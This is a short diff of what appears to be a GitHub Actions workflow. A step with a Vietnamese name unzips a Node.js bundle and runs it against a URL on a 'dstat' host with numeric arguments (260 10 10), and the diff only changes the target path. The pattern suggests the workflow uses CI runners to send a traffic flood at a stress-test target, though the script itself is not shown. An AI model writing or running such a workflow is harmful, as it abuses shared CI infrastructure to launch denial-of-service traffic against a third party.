@@ -22,4 +22,4 @@ jobs:
         run: unzip my_node_app.zip
 
       - name: Chạy script Node.js
-        run: node 2 https://high-cloudflare.dstat123.uk/f5be21f2-7abb-4148-8e97-eacda1d1ed57 260 10 10
+        run: node 2 https://high-cloudflare.dstat123.uk/4bf58e58-58a3-40c3-bce8-6b8e809802dah 260 10 10
